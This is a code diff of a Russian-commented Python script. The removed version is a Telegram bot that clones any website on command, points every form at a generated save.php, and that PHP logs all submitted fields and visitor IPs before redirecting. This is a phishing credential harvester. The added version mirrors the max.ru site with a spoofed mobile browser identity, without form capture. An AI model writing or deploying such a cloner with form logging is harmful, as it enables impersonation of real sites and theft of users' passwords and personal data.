@@ -1,209 +1,182 @@
-import telebot
 import requests
 from bs4 import BeautifulSoup
 import os
 import shutil
 from urllib.parse import urljoin, urlparse
-import zipfile
-import threading
 import time
-import json
-from flask import Flask, request
 
-# ========== КОНФИГ ==========
-import os
-BOT_TOKEN = os.environ.get('BOT_TOKEN')
-ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
-ALLOWED_USERS = [ADMIN_ID]
-ACTIVE_TASKS = {}
+TARGET = "https://max.ru"
+OUTPUT_DIR = "max_ru_full"
 
-bot = telebot.TeleBot(BOT_TOKEN)
+# Очистка и создание папок
+if os.path.exists(OUTPUT_DIR):
+    shutil.rmtree(OUTPUT_DIR)
+os.makedirs(OUTPUT_DIR)
+os.makedirs(f"{OUTPUT_DIR}/css", exist_ok=True)
+os.makedirs(f"{OUTPUT_DIR}/js", exist_ok=True)
+os.makedirs(f"{OUTPUT_DIR}/images", exist_ok=True)
+os.makedirs(f"{OUTPUT_DIR}/fonts", exist_ok=True)
 
-# ========== ВЕБ-СЕРВЕР ДЛЯ RAILWAY ==========
-app = Flask(__name__)
+# СЕССИЯ С МОБИЛЬНЫМ User-Agent
+session = requests.Session()
+session.headers.update({
+    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'Accept-Language': 'ru-RU,ru;q=0.9',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Connection': 'keep-alive',
+    'Upgrade-Insecure-Requests': '1',
+    'Sec-Fetch-Site': 'none',
+    'Sec-Fetch-Mode': 'navigate',
+    'Sec-Fetch-Dest': 'document',
+})
 
-@app.route('/')
-def home():
-    return "Bot is running!"
-
-# ========== КЛОНЕР САЙТОВ ==========
-class SiteCloner:
-    def __init__(self, target_url, task_id, chat_id):
-        self.target_url = target_url.rstrip('/')
-        self.task_id = task_id
-        self.chat_id = chat_id
-        self.output_dir = f"/tmp/clones/{task_id}"
-        self.visited = set()
+def download_asset(url, folder):
+    """Скачивает ассет с реферером"""
+    try:
+        if not url.startswith('http'):
+            url = urljoin(TARGET, url)
         
-        os.makedirs(self.output_dir, exist_ok=True)
-        os.makedirs(f"{self.output_dir}/css", exist_ok=True)
-        os.makedirs(f"{self.output_dir}/js", exist_ok=True)
-        os.makedirs(f"{self.output_dir}/images", exist_ok=True)
-        
-        self.session = requests.Session()
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        })
-    
-    def download_file(self, url, folder):
-        try:
-            if not url.startswith('http'):
-                url = urljoin(self.target_url, url)
-            
-            filename = os.path.basename(urlparse(url).path) or f"file_{hash(url)%10000}"
-            filepath = f"{self.output_dir}/{folder}/{filename}"
-            
-            resp = self.session.get(url, timeout=10)
-            if resp.status_code == 200:
-                with open(filepath, 'wb') as f:
-                    f.write(resp.content)
-                return f"{folder}/{filename}"
-        except:
+        # Пропускаем внешние CDN
+        if 'max.ru' not in url and 'vk.com' not in url:
             return None
-    
-    def clone(self):
-        bot.send_message(self.chat_id, f"🔄 Клонирую: {self.target_url}")
         
-        try:
-            response = self.session.get(self.target_url, timeout=15)
-            
-            if response.status_code != 200:
-                bot.send_message(self.chat_id, f"❌ Ошибка: HTTP {response.status_code}")
-                return None
-            
-            soup = BeautifulSoup(response.text, 'html.parser')
-            
-            bot.send_message(self.chat_id, "📥 Скачиваю CSS...")
-            for tag in soup.find_all('link', href=True):
-                if '.css' in tag['href']:
-                    local = self.download_file(tag['href'], 'css')
-                    if local:
-                        tag['href'] = local
-            
-            bot.send_message(self.chat_id, "📥 Скачиваю JS...")
-            for tag in soup.find_all('script', src=True):
-                local = self.download_file(tag['src'], 'js')
-                if local:
-                    tag['src'] = local
-            
-            bot.send_message(self.chat_id, "📥 Скачиваю картинки...")
-            for tag in soup.find_all('img', src=True):
-                local = self.download_file(tag['src'], 'images')
-                if local:
-                    tag['src'] = local
-            
-            for form in soup.find_all('form'):
-                form['action'] = 'save.php'
-                form['method'] = 'POST'
-            
-            with open(f'{self.output_dir}/save.php', 'w') as f:
-                f.write('''<?php
-$data = $_POST;
-$data['ip'] = $_SERVER['REMOTE_ADDR'];
-$data['time'] = date('Y-m-d H:i:s');
-file_put_contents('logs.txt', json_encode($data)."\\n", FILE_APPEND);
-header('Location: https://' . $_SERVER['HTTP_HOST']);
-?>''')
-            
-            with open(f'{self.output_dir}/index.html', 'w', encoding='utf-8') as f:
-                f.write(str(soup))
-            
-            zip_path = f"/tmp/clones/{self.task_id}.zip"
-            shutil.make_archive(f"/tmp/clones/{self.task_id}", 'zip', self.output_dir)
-            
-            return zip_path
-            
-        except requests.exceptions.ConnectionError:
-            bot.send_message(self.chat_id, "❌ Сайт не существует или недоступен")
-            return None
-        except Exception as e:
-            bot.send_message(self.chat_id, f"❌ Ошибка: {str(e)[:200]}")
-            return None
-
-# ========== КОМАНДЫ ==========
-
-@bot.message_handler(commands=['start'])
-def start(message):
-    if message.from_user.id not in ALLOWED_USERS:
-        bot.reply_to(message, "⛔ Доступ запрещён")
-        return
-    bot.reply_to(message, "🚀 Бот запущен на Railway!\n/clone URL — клонировать сайт")
-
-@bot.message_handler(commands=['clone'])
-def clone_site(message):
-    if message.from_user.id not in ALLOWED_USERS:
-        bot.reply_to(message, "⛔ Доступ запрещён")
-        return
-    
-    args = message.text.split()
-    if len(args) < 2:
-        bot.reply_to(message, "❌ Укажи URL: /clone https://site.com")
-        return
-    
-    url = args[1]
-    if not url.startswith('http'):
-        url = 'https://' + url
-    
-    task_id = str(int(time.time()))[-8:]
-    ACTIVE_TASKS[task_id] = {
-        'url': url,
-        'status': 'cloning',
-        'chat_id': message.chat.id,
-        'started': time.time()
-    }
-    
-    bot.reply_to(message, f"🔔 Задача #{task_id}\n🎯 {url}")
-    
-    def process():
-        cloner = SiteCloner(url, task_id, message.chat.id)
-        zip_file = cloner.clone()
+        filename = os.path.basename(urlparse(url).path.split('?')[0])
+        if not filename or len(filename) < 3:
+            filename = f"asset_{hash(url)%10000}"
         
-        if zip_file and os.path.exists(zip_file):
-            ACTIVE_TASKS[task_id]['status'] = 'done'
-            ACTIVE_TASKS[task_id]['file'] = zip_file
-            size_mb = os.path.getsize(zip_file) / (1024 * 1024)
-            bot.send_message(message.chat.id, f"✅ #{task_id} готов!\n📦 {size_mb:.1f} MB\n📥 /get {task_id}")
+        # Добавляем расширение если нет
+        if '.' not in filename:
+            if 'css' in url:
+                filename += '.css'
+            elif 'js' in url or 'javascript' in url:
+                filename += '.js'
+            else:
+                filename += '.bin'
+        
+        filepath = f"{OUTPUT_DIR}/{folder}/{filename}"
+        
+        headers = {
+            'Referer': TARGET,
+            'Origin': TARGET,
+        }
+        
+        resp = session.get(url, headers=headers, timeout=15)
+        if resp.status_code == 200 and len(resp.content) > 100:
+            with open(filepath, 'wb') as f:
+                f.write(resp.content)
+            print(f"  ✅ {folder}/{filename} ({len(resp.content)} bytes)")
+            return f"{folder}/{filename}"
         else:
-            ACTIVE_TASKS[task_id]['status'] = 'failed'
-            bot.send_message(message.chat.id, f"❌ #{task_id} провалена")
-    
-    threading.Thread(target=process).start()
+            print(f"  ⚠️ Пропущен: {url} (статус: {resp.status_code}, размер: {len(resp.content)})")
+            return None
+    except Exception as e:
+        print(f"  ❌ Ошибка: {url} — {str(e)[:50]}")
+        return None
 
-@bot.message_handler(commands=['get'])
-def get_file(message):
-    if message.from_user.id not in ALLOWED_USERS:
-        bot.reply_to(message, "⛔ Доступ запрещён")
-        return
-    
-    args = message.text.split()
-    if len(args) < 2:
-        return
-    
-    task_id = args[1]
-    task = ACTIVE_TASKS.get(task_id)
-    
-    if not task or task['status'] != 'done':
-        bot.reply_to(message, "❌ Нет готового файла")
-        return
-    
-    with open(task['file'], 'rb') as f:
-        bot.send_document(message.chat.id, f, visible_file_name=f"clone_{task_id}.zip")
+# ========== ЗАГРУЖАЕМ ГЛАВНУЮ ==========
+print(f"[*] Загружаем {TARGET} как мобильное устройство...")
 
-@bot.message_handler(commands=['status'])
-def status(message):
-    if not ACTIVE_TASKS:
-        bot.reply_to(message, "📭 Нет задач")
-        return
-    text = "📊 ЗАДАЧИ:\n"
-    for tid, t in ACTIVE_TASKS.items():
-        e = {'cloning':'⏳','done':'✅','failed':'❌'}.get(t['status'],'❓')
-        text += f"{e} #{tid} — {t['url']}\n"
-    bot.reply_to(message, text)
-
-# ========== ЗАПУСК ==========
-def run_bot():
-    bot.infinity_polling()
-
-if __name__ == '__main__':
-    threading.Thread(target=run_bot).start()
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+try:
+    # РАЗРЕШАЕМ РЕДИРЕКТЫ и следуем за ними
+    response = session.get(TARGET, allow_redirects=True, timeout=20)
+    
+    print(f"[*] Финальный URL после редиректов: {response.url}")
+    print(f"[*] Статус: {response.status_code}")
+    print(f"[*] Content-Type: {response.headers.get('Content-Type', 'неизвестно')}")
+    print(f"[*] Размер страницы: {len(response.text)} символов\n")
+    
+    if response.status_code != 200:
+        print(f"❌ Ошибка загрузки: HTTP {response.status_code}")
+        exit(1)
+    
+    # Сохраняем сырой HTML для отладки
+    with open(f'{OUTPUT_DIR}/debug_source.html', 'w', encoding='utf-8') as f:
+        f.write(response.text)
+    print("[*] Исходный HTML сохранён в debug_source.html")
+    
+    soup = BeautifulSoup(response.text, 'html.parser')
+    
+    # Ищем ВСЕ возможные ресурсы
+    print("\n[*] Скачиваем ВСЕ ресурсы...")
+    print("=" * 50)
+    
+    # CSS: link, style, @import
+    for tag in soup.find_all(['link', 'style']):
+        if tag.name == 'link' and tag.get('href'):
+            href = tag['href']
+            if any(x in href.lower() for x in ['.css', 'style', 'font']):
+                local = download_asset(href, 'css' if '.css' in href else 'fonts')
+                if local:
+                    tag['href'] = local
+    
+    # JavaScript
+    for tag in soup.find_all('script', src=True):
+        local = download_asset(tag['src'], 'js')
+        if local:
+            tag['src'] = local
+    
+    # Изображения
+    for tag in soup.find_all('img', src=True):
+        local = download_asset(tag['src'], 'images')
+        if local:
+            tag['src'] = local
+    
+    # SVG и иконки
+    for tag in soup.find_all(['use', 'object'], href=True):
+        local = download_asset(tag['href'], 'images')
+        if local:
+            tag['href'] = local
+    
+    # Фоновые изображения в style атрибутах
+    import re
+    for tag in soup.find_all(style=True):
+        urls = re.findall(r'url\([\'"]?([^\'")]+)[\'"]?\)', str(tag.get('style')))
+        for url in urls:
+            local = download_asset(url, 'images')
+            if local:
+                tag['style'] = str(tag['style']).replace(url, local)
+    
+    # ВСЕ ссылки делаем локальными
+    for tag in soup.find_all(href=True):
+        href = tag['href']
+        if href.startswith('http') and 'max.ru' in href:
+            tag['href'] = href.replace('https://max.ru', '').replace('http://max.ru', '')
+    
+    for tag in soup.find_all(src=True):
+        src = tag['src']
+        if src.startswith('http') and 'max.ru' in src:
+            tag['src'] = src.replace('https://max.ru', '').replace('http://max.ru', '')
+    
+    # Сохраняем обработанный HTML
+    output_file = f'{OUTPUT_DIR}/index.html'
+    with open(output_file, 'w', encoding='utf-8') as f:
+        f.write('<!DOCTYPE html>\n')
+        f.write('<html lang="ru">\n')
+        f.write('<head>\n')
+        f.write('<meta charset="UTF-8">\n')
+        f.write('<meta name="viewport" content="width=device-width, initial-scale=1.0">\n')
+        f.write('<title>MAX</title>\n')
+        f.write('<base href="/">\n')
+        f.write('</head>\n')
+        f.write('<body>\n')
+        f.write(str(soup))
+        f.write('\n</body>\n')
+        f.write('</html>')
+    
+    # Статистика
+    total_files = 0
+    for root, dirs, files in os.walk(OUTPUT_DIR):
+        total_files += len(files)
+    
+    print("\n" + "=" * 50)
+    print(f"✅ КЛОНИРОВАНИЕ ЗАВЕРШЕНО!")
+    print(f"📁 Папка: {OUTPUT_DIR}/")
+    print(f"📄 Главная: {OUTPUT_DIR}/index.html")
+    print(f"📦 Всего файлов: {total_files}")
+    print(f"📊 Размер: {sum(os.path.getsize(os.path.join(root, name)) for root, dirs, files in os.walk(OUTPUT_DIR) for name in files) / 1024:.1f} KB")
+    
+except Exception as e:
+    print(f"❌ КРИТИЧЕСКАЯ ОШИБКА: {e}")
+    import traceback
+    traceback.print_exc()
